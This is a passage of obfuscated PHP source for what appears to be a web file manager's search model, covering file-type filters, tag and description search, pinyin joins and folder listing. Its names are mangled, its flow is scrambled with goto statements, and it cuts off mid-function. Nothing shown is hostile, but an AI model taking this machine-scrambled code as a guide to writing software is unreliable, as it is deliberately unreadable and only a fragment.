$b´Å´¡‘ÇÍ[84] => time(), $b´Å´¡‘ÇÍ[432] => USER_ID); Model($b´Å´¡‘ÇÍ[791])->where(array($b´Å´¡‘ÇÍ[394] => $f•’ˆ‰Ç•®))->save($b’³‡¶†Ó›); goto e¸¿²ÓÖÁ‘; eùùîœâÜß: $b´Å´¡‘ÇÍ =& $_SERVER[Ç³Íß¦Ó]; $c¦“„«Í· = Model($b´Å´¡‘ÇÍ[791])->sourceInfo($f•’ˆ‰Ç•®); $this->addHistory($c¦“„«Í·, LNG($b´Å´¡‘ÇÍ[1928])); goto CäÎğ¢†ÔÍ; e¸¿²ÓÖÁ‘: return $this->where(array($b´Å´¡‘ÇÍ[410] => $BÃê—¶ƒ„ã))->delete(); goto c£¶˜ªÚÒÁ; c£¶˜ªÚÒÁ: } public function clearSame($a’¹™È© ³) { goto F‘Û‚¨È‰; fİó«—ã›: $E®±¯‚—ÆÓ = array(); $BÜ³‚Şò°´ = array(); foreach ($EÛšğøø…ù as $B ‹ñ§¡¯ö) { if (!$B ‹ñ§¡¯ö || count($B ‹ñ§¡¯ö) <= 1) { continue; } foreach ($B ‹ñ§¡¯ö as $eŸç›·•çÙ) { $E®±¯‚—ÆÓ[] = $eŸç›·•çÙ[$bÜùé‚ ¡©[445]]; $BÜ³‚Şò°´[] = $eŸç›·•çÙ[$bÜùé‚ ¡©[392]]; } } goto F»­Ê„Ì¥; F»­Ê„Ì¥: if (!$BÜ³‚Şò°´) { return; } $this->where(array($bÜùé‚ ¡©[392] => array($bÜùé‚ ¡©[7], $BÜ³‚Şò°´)))->delete(); Model($bÜùé‚ ¡©[448])->remove($E®±¯‚—ÆÓ); goto cõÉò”·¯; F‘Û‚¨È‰: $bÜùé‚ ¡© =& $_SERVER[Ç³Íß¦Ó]; $dÚã‚±‚™À = $this->listData($a’¹™È© ³); $EÛšğøø…ù = array_to_keyvalue_group($dÚã‚±‚™À, $bÜùé‚ ¡©[445]); goto fİó«—ã›; cõÉò”·¯: } public function userSpace() { $C”ñ¿Œ¢æ =& $_SERVER[Ç³Íß¦Ó]; $Dçñê’„Á— = $this->tablePrefix; $eÍ‹ì¥š¯™ = array($C”ñ¿Œ¢æ[1518] => USER_ID); $a‰²‡»½ç = "{$Dçñê’„Á—}\151\x6f\x5f\146\x69\154\145\40\x66\151\154\145\163\x20\x6f\x6e\x20\x66\151\x6c\145\x73\x2e\x66\151\154\145\111\104\40\x3d\x20\x68\x69\163\x74\157\x72\171\x2e\x66\151\x6c\x65\x49\104"; return $this->alias($C”ñ¿Œ¢æ[1926])->where($eÍ‹ì¥š¯™)->join($a‰²‡»½ç, $C”ñ¿Œ¢æ[1927])->sum($C”ñ¿Œ¢æ[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($B‹İ˜œ‡¥) { goto Eº†ÀÍŒÉ¶; D°‰“’Ş: if (!$eëŒÃŠÖ÷Í) { return array(); } $Bèİ¦‘¬„¸ = $eëŒÃŠÖ÷Í[$C¬êæïƒ¼¯[168]]; $bÃ£³âá³ = $C¬êæïƒ¼¯[7]; goto f˜ËâÕÀ¯; f˜ËâÕÀ¯: if (!$eëŒÃŠÖ÷Í[$C¬êæïƒ¼¯[168]]) { $c‹ãÆ‚Áâ¶ = array_to_keyvalue($E‘­¼“Ì·§, $C¬êæïƒ¼¯[33], $C¬êæïƒ¼¯[168]); $Bèİ¦‘¬„¸ = implode($C¬êæïƒ¼¯[47], $c‹ãÆ‚Áâ¶); $bÃ£³âá³ = $C¬êæïƒ¼¯[1929]; } $d†”Æö²™Š = explode($C¬êæïƒ¼¯[47], trim($Bèİ¦‘¬„¸, $C¬êæïƒ¼¯[47])); return array($bÃ£³âá³, $d†”Æö²™Š); goto cóàéµŠ˜õ; Eº†ÀÍŒÉ¶: $C¬êæïƒ¼¯ =& $_SERVER[Ç³Íß¦Ó]; $E‘­¼“Ì·§ = KodIO::fileTypeList(); $eëŒÃŠÖ÷Í = $E‘­¼“Ì·§[$B‹İ˜œ‡¥]; goto D°‰“’Ş; cóàéµŠ˜õ: } public function listPathType($C£ĞßŠñ‹ß) { $cÜâ”§Î—í =& $_SERVER[Ç³Íß¦Ó]; $cëÀ¹èÒ”µ = $this->fileTypeWhere($C£ĞßŠñ‹ß); if (!$cëÀ¹èÒ”µ) { return array(); } $cÜš˜½‚à = array($cÜâ”§Î—í[548] => SourceModel::TYPE_USER, $cÜâ”§Î—í[549] => USER_ID, $cÜâ”§Î—í[545] => 0, $cÜâ”§Î—í[546] => $cëÀ¹èÒ”µ); return $this->listSource($cÜš˜½‚à); } public function listSearch($fÙØÄÌñˆ, $E÷£Ï³¹ä± = 300) { goto Cæ¼éä‰µ×; c«Ê×ªóï±: $this->_listSearchBindPinyin($fÙØÄÌñˆ, $c³‚ƒ’íé, $B¯ëÄÚÀ); $this->alias($b†ÃÌÚœÂ[515])->_makeOrder(); $c³‚ƒ’íé = $this->parseWhereLike($c³‚ƒ’íé); goto F­˜İ¶ø‘Ä; F­˜İ¶ø‘Ä: $dºØåÛ¤›´ = $this->distinct(!0)->field($B¯ëÄÚÀ)->where($c³‚ƒ’íé)->selectPage($E÷£Ï³¹ä±); $this->_listSearchFileContent($dºØåÛ¤›´, $fÙØÄÌñˆ, $cÈÍŠä…Ãõ); $this->_listSearchDesc($dºØåÛ¤›´, $fÙØÄÌñˆ, $cÈÍŠä…Ãõ); goto A‹À“í»Ñ; Cæ¼éä‰µ×: $b†ÃÌÚœÂ =& $_SERVER[Ç³Íß¦Ó]; if (isset($fÙØÄÌñˆ[$b†ÃÌÚœÂ[1772]]) && $fÙØÄÌñˆ[$b†ÃÌÚœÂ[1772]]) { $fÙØÄÌñˆ[$b†ÃÌÚœÂ[1772]] = str_replace($b†ÃÌÚœÂ[380], $b†ÃÌÚœÂ[1930], trim($fÙØÄÌñˆ[$b†ÃÌÚœÂ[1772]])); } $c³‚ƒ’íé = $this->_parseSearchWhere($fÙØÄÌñˆ); goto A¦´áö ƒ×; A¦´áö ƒ×: if (!isset($c³‚ƒ’íé[$b†ÃÌÚœÂ[421]])) { $c³‚ƒ’íé[$b†ÃÌÚœÂ[421]] = 0; } $B¯ëÄÚÀ = $b†ÃÌÚœÂ[1931]; $cÈÍŠä…Ãõ = $B¯ëÄÚÀ; goto c«Ê×ªóï±; Cµ×‘­××Á: $this->_listMake($dºØåÛ¤›´); return $dºØåÛ¤›´; goto FÓ›Œ­ÓåÈ; A‹À“í»Ñ: $this->_listSearchTag($dºØåÛ¤›´, $fÙØÄÌñˆ, $cÈÍŠä…Ãõ); $this->_listSearchGroupTag($dºØåÛ¤›´, $fÙØÄÌñˆ, $cÈÍŠä…Ãõ); $this->_listDataApply($dºØåÛ¤›´[$b†ÃÌÚœÂ[366]]); goto Cµ×‘­××Á; FÓ›Œ­ÓåÈ: } private function _listSearchFileContent(&$d™ÓÌ²œ£¿, $AõÄÉ Å½, $aÈº¤Ï¯Ï©) { goto BğŞ«Ê‡…«; F‡–ÈÆŠÃ: unset($AõÄÉ Å½[$b‹µÖà¾Ş‹[445]]); $fóŞ¾Æìæ« = $this->field($aÈº¤Ï¯Ï©)->where($c‡™ğÈ ¼’)->limit($b‹µÖà¾Ş‹[1932])->select(); if (!$fóŞ¾Æìæ« || count($fóŞ¾Æìæ«) == 0) { return; } goto E×ƒáë›ÍĞ; dÍ‰ÔäÊé: if (!isset($c‡™ğÈ ¼’[$b‹µÖà¾Ş‹[28]]) || !is_array($AõÄÉ Å½[$b‹µÖà¾Ş‹[445]])) { return; } $c‡™ğÈ ¼’[$b‹µÖà¾Ş‹[445]] = array($b‹µÖà¾Ş‹[7], $AõÄÉ Å½[$b‹µÖà¾Ş‹[445]]); unset($c‡™ğÈ ¼’[$b‹µÖà¾Ş‹[28]]); goto F‡–ÈÆŠÃ; BğŞ«Ê‡…«: $b‹µÖà¾Ş‹ =& $_SERVER[Ç³Íß¦Ó]; if (!$AõÄÉ Å½[$b‹µÖà¾Ş‹[1772]] || $d™ÓÌ²œ£¿[$b‹µÖà¾Ş‹[363]][$b‹µÖà¾Ş‹[350]] > 1) { return; } $c‡™ğÈ ¼’ = $this->_parseSearchWhere($AõÄÉ Å½); goto dÍ‰ÔäÊé; E×ƒáë›ÍĞ: $d™ÓÌ²œ£¿[$b‹µÖà¾Ş‹[366]] = array_merge($fóŞ¾Æìæ«, $d™ÓÌ²œ£¿[$b‹µÖà¾Ş‹[366]]); $d™ÓÌ²œ£¿[$b‹µÖà¾Ş‹[363]][$b‹µÖà¾Ş‹[364]] += count($fóŞ¾Æìæ«); goto d›Ë˜ÈÁÇ; d›Ë˜ÈÁÇ: } private function _listSearchTag(&$FóàÁØöä, $d×ê¨öÆ‘², $E¯ò®áà¿µ) { goto dİôù©‰Ó›; e³Ï¦ÁÛä: $eŒÖ¬â®Ô = array(); $cç¦¦ŸŸÎÛ = $d×ê¨öÆ‘²[$eøø–“šÒˆ[1772]]; foreach ($CØÚÓ Ä÷© as $d°áŠ˜†¶Ş) { $fç‚ˆùàŠÓ = $d°áŠ˜†¶Ş[$eøø–“šÒˆ[28]]; $FÊš„Ë•½è = str_replace($eøø–“šÒˆ[50], $eøø–“šÒˆ[33], Pinyin::encode($fç‚ˆùàŠÓ)); if (stripos($fç‚ˆùàŠÓ, $cç¦¦ŸŸÎÛ) !== !1 || stripos($FÊš„Ë•½è, $cç¦¦ŸŸÎÛ) !== !1) { $eŒÖ¬â®Ô[] = $d°áŠ˜†¶Ş[$eøø–“šÒˆ[392]]; } } goto B—°†‚˜ÚÊ; B—°†‚˜ÚÊ: if (!$eŒÖ¬â®Ô) { return; } $c±•êæ°àê = array($eøø–“šÒˆ[417] => array($eøø–“šÒˆ[7], $eŒÖ¬â®Ô), $eøø–“šÒˆ[1526] => USER_ID); $f ‚‘ÈÆ‰ = Model($eøø–“šÒˆ[418])->field($eøø–“šÒˆ[76])->where($c±•êæ°àê)->select(); goto bÕŒ¾õÏØ²; dİôù©‰Ó›: $eøø–“šÒˆ =& $_SERVER[Ç³Íß¦Ó]; if (!$d×ê¨öÆ‘²[$eøø–“šÒˆ[1772]] || $FóàÁØöä[$eøø–“šÒˆ[363]][$eøø–“šÒˆ[350]] > 1) { return; } $CØÚÓ Ä÷© = Model($eøø–“šÒˆ[1933])->listData(); goto e³Ï¦ÁÛä; bÕŒ¾õÏØ²: $f ‚‘ÈÆ‰ = array_to_keyvalue($f ‚‘ÈÆ‰, $eøø–“šÒˆ[33], $eøø–“šÒˆ[76]); $a—ÜÜ°½¢¼ = array_unique($f ‚‘ÈÆ‰); $this->_listSearchMerge($FóàÁØöä, $d×ê¨öÆ‘², $E¯ò®áà¿µ, $a—ÜÜ°½¢¼); goto Cİ„Ë—; Cİ„Ë—: } private function _listSearchDesc(&$aõçÀ²ŞÑÉ, $Eƒ¿íºŞÎ, $A×Å™ÉÍÒ) { goto d—É©Ö¼½; C×Ëª¯“ƒ: $f…«œÕãƒ = Model($eŒâÒìÃ²…[531])->field($eŒâÒìÃ²…[394])->where($DÇ®‚ìã)->select(); $fîŒæÓ¶©à = array_to_keyvalue($f…«œÕãƒ, $eŒâÒìÃ²…[33], $eŒâÒìÃ²…[394]); $this->_listSearchMerge($aõçÀ²ŞÑÉ, $Eƒ¿íºŞÎ, $A×Å™ÉÍÒ, $fîŒæÓ¶©à); goto D­îÂ‡‚¢î; dêÒŒ™Ï§›: $dÛ°İ¼£¸‡ = array_unique($dÛ°İ¼£¸‡); if (!$dÛ°İ¼£¸‡) { return; } $DÇ®‚ìã = array($eŒâÒìÃ²…[394] => array($eŒâÒìÃ²…[7], $dÛ°İ¼£¸‡), $eŒâÒìÃ²…[93] => $eŒâÒìÃ²…[429], $eŒâÒìÃ²…[371] => array($eŒâÒìÃ²…[379], $eŒâÒìÃ²…[1774] . $Eƒ¿íºŞÎ[$eŒâÒìÃ²…[1772]] . $eŒâÒìÃ²…[1774])); goto C×Ëª¯“ƒ; d—É©Ö¼½: $eŒâÒìÃ²… =& $_SERVER[Ç³Íß¦Ó]; if (!$Eƒ¿íºŞÎ[$eŒâÒìÃ²…[1772]] || $aõçÀ²ŞÑÉ[$eŒâÒìÃ²…[363]][$eŒâÒìÃ²…[350]] > 1) { return; } $dÛ°İ¼£¸‡ = $this->listSearchChildren($Eƒ¿íºŞÎ[$eŒâÒìÃ²…[476]]); goto dêÒŒ™Ï§›; D­îÂ‡‚¢î: } private function _listSearchGroupTag(&$F‡›Èëé‰…, $A·÷Ö¨†Úì, $aÜ‹Ì«¸íÑ) { goto F–»òêôÔ©; Aß”Ğèóçö: $e÷Ó…Ô±° = array_to_keyvalue($e÷Ó…Ô±°, $Fí ïÂÑêê[33], $Fí ïÂÑêê[76]); $dÄ‹Ú”¯¬Ù = array_unique($e÷Ó…Ô±°); $this->_listSearchMerge($F‡›Èëé‰…, $A·÷Ö¨†Úì, $aÜ‹Ì«¸íÑ, $dÄ‹Ú”¯¬Ù); goto C §×ëŠ¨; CŒ¡³æø£Ö: if (!$C×¥ô‚ëƒ || $C×¥ô‚ëƒ[$Fí ïÂÑêê[402]] != SourceModel::TYPE_GROUP) { return; } $F¶åçÕ——î = $C×¥ô‚ëƒ[$Fí ïÂÑêê[482]]; $c…Ø¨¼‰Åé = Model($Fí ïÂÑêê[1934])->get($F¶åçÕ——î); goto C·¦È†¾™ó; a‘­“í¸Ü: if (!$e¨²ŞëÃÛœ) { return; } $eÓõŒ¿–Ï… = array($Fí ïÂÑêê[417] => array($Fí ïÂÑêê[7], $e¨²ŞëÃÛœ), $Fí ïÂÑêê[1526] => 0, $Fí ïÂÑêê[29] => $Fí ïÂÑêê[1796] . $F¶åçÕ——î); $e÷Ó…Ô±° = Model($Fí ïÂÑêê[418])->field($Fí ïÂÑêê[76])->where($eÓõŒ¿–Ï…)->select(); goto Aß”Ğèóçö; C·¦È†¾™ó: $e¨²ŞëÃÛœ = array(); $b¥Îæãíƒ = $A·÷Ö¨†Úì[$Fí ïÂÑêê[1772]]; foreach ($c…Ø¨¼‰Åé[$Fí ïÂÑêê[366]] as $CÌÃ¤ìõ¨…) { $Cºæ®ÊÏæ = $CÌÃ¤ìõ¨…[$Fí ïÂÑêê[28]]; $EÏµêÑÌ§ = str_replace($Fí ïÂÑêê[50], $Fí ïÂÑêê[33], Pinyin::encode($Cºæ®ÊÏæ)); if (stripos($Cºæ®ÊÏæ, $b¥Îæãíƒ) !== !1 || stripos($EÏµêÑÌ§, $b¥Îæãíƒ) !== !1) { $e¨²ŞëÃÛœ[] = $CÌÃ¤ìõ¨…[$Fí ïÂÑêê[392]]; } } goto a‘­“í¸Ü; F–»òêôÔ©: $Fí ïÂÑêê =& $_SERVER[Ç³Íß¦Ó]; if (!$A·÷Ö¨†Úì[$Fí ïÂÑêê[1772]] || $F‡›Èëé‰…[$Fí ïÂÑêê[363]][$Fí ïÂÑêê[350]] > 1 || !$A·÷Ö¨†Úì[$Fí ïÂÑêê[476]]) { return; } $C×¥ô‚ëƒ = $this->sourceInfo($A·÷Ö¨†Úì[$Fí ïÂÑêê[476]]); goto CŒ¡³æø£Ö; C §×ëŠ¨: } private function _listSearchMerge(&$eÒÆ¤ÁèË‚, $bŸ’õ‹£Ì‚, $a¶á„Ûê†£, $e»·†÷šì) { goto cï¹…³…‡‡; dã‰ƒÍÍ¤©: $e»…ÌÏïÓ¢ = array_diff($e»·†÷šì, $eŞ×’íäÜ¬); if (!$e»…ÌÏïÓ¢) { return; } $d×ëŞ™ª¼– = array($c¸²«É¢™[394] => array($c¸²«É¢™[7], $e»…ÌÏïÓ¢)); goto fÚ¢‡ƒ¢„Ã; bšÎ øÁ‰: foreach ($a’à­×ãÏ as $F‚ÛÖ÷Ì) { if ($this->_listSearchFilter($F‚ÛÖ÷Ì, $bŸ’õ‹£Ì‚)) { $b¥Òí—Î[] = $F‚ÛÖ÷Ì; } } $eÒÆ¤ÁèË‚[$c¸²«É¢™[366]] = array_merge($b¥Òí—Î, $eÒÆ¤ÁèË‚[$c¸²«É¢™[366]]); $eÒÆ¤ÁèË‚[$c¸²«É¢™[363]][$c¸²«É¢™[364]] += count($b¥Òí—Î); goto føÃŒÓ†œ; cï¹…³…‡‡: $c¸²«É¢™ =& $_SERVER[Ç³Íß¦Ó]; if (!$e»·†÷šì) { return; } $eŞ×’íäÜ¬ = array_to_keyvalue($eÒÆ¤ÁèË‚[$c¸²«É¢™[366]], $c¸²«É¢™[33], $c¸²«É¢™[394]); goto dã‰ƒÍÍ¤©; fÚ¢‡ƒ¢„Ã: $a’à­×ãÏ = $this->field($a¶á„Ûê†£)->where($d×ëŞ™ª¼–)->select(); if (!$a’à­×ãÏ) { return; } $b¥Òí—Î = array(); goto bšÎ øÁ‰; føÃŒÓ†œ: } private function _listSearchFilter($Bˆ’Öñ“»Œ, $A‰‚×Òğãá) { goto d‚±¼¢²Èù; d‚±¼¢²Èù: $D™Ó» ÉÂÃ =& $_SERVER[Ç³Íß¦Ó]; $fà²¯¿ñºñ = $Bˆ’Öñ“»Œ[$D™Ó» ÉÂÃ[401]] == $D™Ó» ÉÂÃ[87]; if (!strstr($Bˆ’Öñ“»Œ[$D™Ó» ÉÂÃ[485]], $D™Ó» ÉÂÃ[47] . $A‰‚×Òğãá[$D™Ó» ÉÂÃ[476]] . $D™Ó» ÉÂÃ[47])) { return !1; } goto EÒê¶ì¯ƒ; a÷…ÔÈ˜ç: if (isset($A‰‚×Òğãá[$D™Ó» ÉÂÃ[561]]) && $A‰‚×Òğãá[$D™Ó» ÉÂÃ[561]] != $Bˆ’Öñ“»Œ[$D™Ó» ÉÂÃ[432]]) { return !1; } return !0; goto B¹†Ş×ò÷–; EÒê¶ì¯ƒ: if (isset($A‰‚×Òğãá[$D™Ó» ÉÂÃ[403]]) && $A‰‚×Òğãá[$D™Ó» ÉÂÃ[403]] != $D™Ó» ÉÂÃ[1739]) { if ($A‰‚×Òğãá[$D™Ó» ÉÂÃ[403]] == $D™Ó» ÉÂÃ[77] && !$fà²¯¿ñºñ) { return !1; } if ($A‰‚×Òğãá[$D™Ó» ÉÂÃ[403]] != $D™Ó» ÉÂÃ[77] && $fà²¯¿ñºñ) { return !1; } if (!strstr($Bˆ’Öñ“»Œ[$D™Ó» ÉÂÃ[168]], $D™Ó» ÉÂÃ[47] . $A‰‚×Òğãá[$D™Ó» ÉÂÃ[403]] . $D™Ó» ÉÂÃ[47])) { return !1; } } if (isset($A‰‚×Òğãá[$D™Ó» ÉÂÃ[1935]]) && $A‰‚×Òğãá[$D™Ó» ÉÂÃ[1935]] < $Bˆ’Öñ“»Œ[$D™Ó» ÉÂÃ[78]]) { return !1; } if (isset($A‰‚×Òğãá[$D™Ó» ÉÂÃ[1936]]) && $A‰‚×Òğãá[$D™Ó» ÉÂÃ[1936]] > $Bˆ’Öñ“»Œ[$D™Ó» ÉÂÃ[78]]) { return !1; } goto a÷…ÔÈ˜ç; B¹†Ş×ò÷–: } public function listSearchChildren($dï¼ãíÊåñ, $bÇ½Ó¾ ª« = 5000) { goto D “Û¢É; eœ·äˆ™¦È: $E”´›µè¿ = array($CÄŠ‚ø®ÆÑ[485] => array($CÄŠ‚ø®ÆÑ[379], $B»ÈÜ•Ÿ²[$CÄŠ‚ø®ÆÑ[485]] . $B»ÈÜ•Ÿ²[$CÄŠ‚ø®ÆÑ[394]] . $CÄŠ‚ø®ÆÑ[512])); $aõŠğŸÆÚ„ = $this->field($CÄŠ‚ø®ÆÑ[394])->cache(null, 600)->where($E”´›µè¿)->count(); if ($aõŠğŸÆÚ„ > $bÇ½Ó¾ ª«) { return $this->_listSearchChildrenNear($dï¼ãíÊåñ, $bÇ½Ó¾ ª«); } goto Eê‚òÙš…ä; D “Û¢É: $CÄŠ‚ø®ÆÑ =& $_SERVER[Ç³Íß¦Ó]; $f¹§Ìßæ® = array(); $B»ÈÜ•Ÿ² = $this->sourceInfo($dï¼ãíÊåñ); goto eœ·äˆ™¦È; Eê‚òÙš…ä: $D­ÒÊ•—‹‚ = $this->field($CÄŠ‚ø®ÆÑ[394])->where($E”´›µè¿)->select(); $f¹§Ìßæ® = array_to_keyvalue($D­ÒÊ•—‹‚, $CÄŠ‚ø®ÆÑ[33], $CÄŠ‚ø®ÆÑ[394]); return $f¹§Ìßæ®; goto e›ÁíÊ·²¯; e›ÁíÊ·²¯: } private function _listSearchChildrenNear($dÓÄ­„‘®, $fˆ®×”‹îÎ) { goto E»š‘ò±è¨; FŠÀÀÅƒš: if (!$Ešçñ‡ôİŸ) { return $FŒÈî„ƒ; } $a»”¡´ƒå´ = array($AöŠ¢±´‘¾[476] => array($AöŠ¢±´‘¾[7], $Ešçñ‡ôİŸ)); $F¤ó„¼‹Ÿç = $this->field($AöŠ¢±´‘¾[1937])->where($a»”¡´ƒå´)->limit($fˆ®×”‹îÎ)->select(); goto Eœ‚ñãª­Š; E»š‘ò±è¨: $AöŠ¢±´‘¾ =& $_SERVER[Ç³Íß¦Ó]; $FŒÈî„ƒ = array(); $a»”¡´ƒå´ = array($AöŠ¢±´‘¾[476] => $dÓÄ­„‘®); goto D·„ä“µ¹; D·„ä“µ¹: $F¤ó„¼‹Ÿç = $this->field($AöŠ¢±´‘¾[1937])->where($a»”¡´ƒå´)->select(); $Ešçñ‡ôİŸ = array_to_keyvalue(array_filter_by_field($F¤ó„¼‹Ÿç, $AöŠ¢±´‘¾[401], $AöŠ¢±´‘¾[87]), $AöŠ¢±´‘¾[33], $AöŠ¢±´‘¾[394]); $FŒÈî„ƒ = array_merge($FŒÈî„ƒ, array_to_keyvalue($F¤ó„¼‹Ÿç, $AöŠ¢±´‘¾[33], $AöŠ¢±´‘¾[394])); goto FŠÀÀÅƒš; Eœ‚ñãª­Š: $FŒÈî„ƒ = array_merge($FŒÈî„ƒ, array_to_keyvalue($F¤ó„¼‹Ÿç, $AöŠ¢±´‘¾[33], $AöŠ¢±´‘¾[394])); $FŒÈî„ƒ = array_slice($FŒÈî„ƒ, 0, $fˆ®×”‹îÎ); return $FŒÈî„ƒ; goto a‘¿Ù™å‚¢; a‘¿Ù™å‚¢: } private function _listSearchBindPinyin($d§•²ŸŠô…, &$CÅ¨¦¯à‰ñ, &$eß×º¯ÜòÄ) { goto EÖ’›îï‘Ô; AŒ„äÑòµ: $CÅ¨¦¯à‰ñ = $Cµ«ÅÊ×; goto aŸ«†«½Ç; cùçˆÂ­ƒø: foreach ($CÅ¨¦¯à‰ñ as $EÌùİÈÖ¥ => $BóÂğœõŠ„) { $Cµ«ÅÊ×[$eğ°Íø‰—°[1939] . $EÌùİÈÖ¥] = $BóÂğœõŠ„; } foreach ($D¬ŠéÇÌòË as $DñŠ²¿Û…Ü) { $Cµ«ÅÊ×[] = array($eğ°Íø‰—°[1941] => $DñŠ²¿Û…Ü, $eğ°Íø‰—°[957] => $eğ°Íø‰—°[1776], array($eğ°Íø‰—°[1942] => $DñŠ²¿Û…Ü, $eğ°Íø‰—°[1943] => array($eğ°Íø‰—°[7], array($eğ°Íø‰—°[442], $eğ°Íø‰—°[441])))); } $this->join($Eâ”š©¸²); goto AŒ„äÑòµ; EÖ’›îï‘Ô: $eğ°Íø‰—° =& $_SERVER[Ç³Íß¦Ó]; if (!isset($d§•²ŸŠô…[$eğ°Íø‰—°[1772]]) || !$d§•²ŸŠô…[$eğ°Íø‰—°[1772]]) { return; } if (!Input::check($d§•²ŸŠô…[$eğ°Íø‰—°[1772]], $eğ°Íø‰—°[315]) || strlen($d§•²ŸŠô…[$eğ°Íø‰—°[1772]]) < 2) { return; } goto a­Šˆ§ÜÊ‘; F‹Š¯é­³ù: $eß×º¯ÜòÄ = $eğ°Íø‰—°[1939] . str_replace($eğ°Íø‰—°[47], $eğ°Íø‰—°[1940], $eß×º¯ÜòÄ); $D¬ŠéÇÌòË = $CÅ¨¦¯à‰ñ[$eğ°Íø‰—°[28]]; unset($CÅ¨¦¯à‰ñ[$eğ°Íø‰—°[28]]); goto cùçˆÂ­ƒø; a­Šˆ§ÜÊ‘: $Eâ”š©¸² = "\114\x45\106\x54\40\x4a\x4f\111\116\x20{$this->tablePrefix}\x69\157\137\163\x6f\165\162\143\x65\137\155\x65\x74\141\x20\x6d\145\x74\141\x20\157\x6e\40\163\157\165\x72\143\145\x2e\163\157\165\x72\143\145\x49\104\x20\75\x20\x6d\145\x74\x61\x2e\163\157\x75\162\143\x65\111\x44"; $Cµ«ÅÊ× = array(); $eß×º¯ÜòÄ = str_replace(array($eğ°Íø‰—°[228], $eğ°Íø‰—°[50], $eğ°Íø‰—°[1938]), $eğ°Íø‰—°[33], $eß×º¯ÜòÄ); goto F‹Š¯é­³ù; aŸ«†«½Ç: } private function _parseSearchWhere($e­ÆŒó¤®¼) { goto cÊ‹ºËì£ğ; DÓùÀŠïÃ: if (isset($e­ÆŒó¤®¼[$C¯Øï†¨®Š[561]]) && $e­ÆŒó¤®¼[$C¯Øï†¨®Š[561]]) { $a‰”µÅƒ†–[] = array($C¯Øï†¨®Š[432] => $e­ÆŒó¤®¼[$C¯Øï†¨®Š[561]], $C¯Øï†¨®Š[430] => $e­ÆŒó¤®¼[$C¯Øï†¨®Š[561]], $C¯Øï†¨®Š[957] => $C¯Øï†¨®Š[1776]); } if (isset($e­ÆŒó¤®¼[$C¯Øï†¨®Š[403]]) && $e­ÆŒó¤®¼[$C¯Øï†¨®Š[403]]) { $DãöØĞ¾¯ = $e­ÆŒó¤®¼[$C¯Øï†¨®Š[403]]; if ($DãöØĞ¾¯ == $C¯Øï†¨®Š[77]) { $a‰”µÅƒ†–[$C¯Øï†¨®Š[401]] = 1; } else { if ($DãöØĞ¾¯ == $C¯Øï†¨®Š[1947]) { $a‰”µÅƒ†–[$C¯Øï†¨®Š[401]] = 0; } else { if ($DãöØĞ¾¯) { $DãöØĞ¾¯ = is_array($DãöØĞ¾¯) ? $DãöØĞ¾¯ : explode($C¯Øï†¨®Š[47], $DãöØĞ¾¯); $a‰”µÅƒ†–[$C¯Øï†¨®Š[403]] = array($C¯Øï†¨®Š[409], $DãöØĞ¾¯); $a‰”µÅƒ†–[$C¯Øï†¨®Š[401]] = 0; } } } } if (isset($e­ÆŒó¤®¼[$C¯Øï†¨®Š[476]]) && $e­ÆŒó¤®¼[$C¯Øï†¨®Š[476]]) { $eÕÛ—Í‹øÑ = $this->sourceInfo($e­ÆŒó¤®¼[$C¯Øï†¨®Š[476]]); $a‰”µÅƒ†–[$C¯Øï†¨®Š[552]] = array($C¯Øï†¨®Š[511], $eÕÛ—Í‹øÑ[$C¯Øï†¨®Š[485]] . $e­ÆŒó¤®¼[$C¯Øï†¨®Š[476]] . $C¯Øï†¨®Š[512]); } goto F÷Ú´êÍÌŒ; B‹‘°õãÙğ: if (isset($e­ÆŒó¤®¼[$C¯Øï†¨®Š[474]]) && $e­ÆŒó¤®¼[$C¯Øï†¨®Š[474]]) { $dèä°Áğ¢ = array($C¯Øï†¨®Š[1945], $e­ÆŒó¤®¼[$C¯Øï†¨®Š[474]]); if ($a‰”µÅƒ†–[$C¯Øï†¨®Š[84]]) { $a‰”µÅƒ†–[$C¯Øï†¨®Š[84]] = array($a‰”µÅƒ†–[$C¯Øï†¨®Š[84]], $dèä°Áğ¢, $C¯Øï†¨®Š[1946]); } else { $a‰”µÅƒ†–[$C¯Øï†¨®Š[84]] = $dèä°Áğ¢; } } if (isset($e­ÆŒó¤®¼[$C¯Øï†¨®Š[1935]]) && $e­ÆŒó¤®¼[$C¯Øï†¨®Š[1935]] > 0) { $a‰”µÅƒ†–[$C¯Øï†¨®Š[78]] = array($C¯Øï†¨®Š[1944], $e­ÆŒó¤®¼[$C¯Øï†¨®Š[1935]]); } if (isset($e­ÆŒó¤®¼[$C¯Øï†¨®Š[1936]]) && $e­ÆŒó¤®¼[$C¯Øï†¨®Š[1936]]) { $dèä°Áğ¢ = array($C¯Øï†¨®Š[1945], $e­ÆŒó¤®¼[$C¯Øï†¨®Š[1936]]); if ($a‰”µÅƒ†–[$C¯Øï†¨®Š[78]]) { $a‰”µÅƒ†–[$C¯Øï†¨®Š[78]] = array($a‰”µÅƒ†–[$C¯Øï†¨®Š[78]], $dèä°Áğ¢, $C¯Øï†¨®Š[1946]); } else { $a‰”µÅƒ†–[$C¯Øï†¨®Š[78]] = $dèä°Áğ¢; } } goto DÓùÀŠïÃ; F÷Ú´êÍÌŒ: if (isset($e­ÆŒó¤®¼[$C¯Øï†¨®Š[1772]]) && trim($e­ÆŒó¤®¼[$C¯Øï†¨®Š[1772]])) { $cÒ®®º¥ÏŠ = trim($e­ÆŒó¤®¼[$C¯Øï†¨®Š[1772]]); $dœ«ë•¿ª¦ = explode($C¯Øï†¨®Š[50], $cÒ®®º¥ÏŠ); if (strlen($cÒ®®º¥ÏŠ) > 2 && (substr($cÒ®®º¥ÏŠ, 0, 1) == $C¯Øï†¨®Š[116] && substr($cÒ®®º¥ÏŠ, -1) == $C¯Øï†¨®Š[116]) || substr($cÒ®®º¥ÏŠ, 0, 1) == $C¯Øï†¨®Š[55] && substr($cÒ®®º¥ÏŠ, -1) == $C¯Øï†¨®Š[55]) { $cÒ®®º¥ÏŠ = substr($cÒ®®º¥ÏŠ, 1, -1); $dœ«ë•¿ª¦ = array($cÒ®®º¥ÏŠ); } $a‰”µÅƒ†–[$C¯Øï†¨®Š[28]] = array(array($C¯Øï†¨®Š[511], $C¯Øï†¨®Š[1774] . $cÒ®®º¥ÏŠ . $C¯Øï†¨®Š[1774])); if (count($dœ«ë•¿ª¦) > 1) { $a‰”µÅƒ†–[$C¯Øï†¨®Š[28]] = array(); foreach ($dœ«ë•¿ª¦ as $Fç­˜ÁÆÍà) { if (!trim($Fç­˜ÁÆÍà)) { continue; } 